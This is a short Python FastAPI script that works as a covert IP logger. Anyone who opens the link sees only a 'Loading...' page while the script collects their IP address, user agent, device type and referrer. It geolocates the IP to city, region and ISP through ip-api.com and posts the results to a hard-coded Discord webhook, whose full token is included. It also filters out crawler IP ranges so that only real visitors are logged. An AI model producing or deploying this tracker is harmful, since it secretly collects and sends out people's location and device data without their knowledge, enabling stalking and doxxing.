from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

# Paste your Webhook URL here
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # 1. Get the real client IP
    forwarded = request.headers.get("x-forwarded-for")
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    # 2. Filter out Google/Render bots
    # The 'or' allows you to add more IP ranges later if you see other bots
    if "34.145" in client_ip or "34.168" in client_ip:
        return HTMLResponse(content="<h1>Loading...</h1>")

    # 3. Capture extra metadata
    full_ua = request.headers.get("user-agent", "Unknown")
    device = "Mobile" if "Mobile" in full_ua else "Desktop"
    browser = "Chrome" if "Chrome" in full_ua else "Other Browser"
    referrer = request.headers.get("referer", "Direct/None")

    # 4. Attempt to lookup location and send to Discord
    try:
        url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query"
        resp = requests.get(url, timeout=5).json()
        
        if resp.get("status") == "success":
            message = (
                f"**Dashboard Log**\n"
                f"IP: `{resp.get('query')}`\n"
                f"Location: `{resp.get('city')}, {resp.get('regionName')}`\n"
                f"ISP: `{resp.get('isp')}` | Proxy: `{resp.get('proxy')}`\n"
                f"Device: `{device} ({browser})`\n"
                f"Referrer: `{referrer}`"
            )
            requests.post(WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print(f"Error: {e}")

    return HTMLResponse(content="<h1>Loading...</h1>")
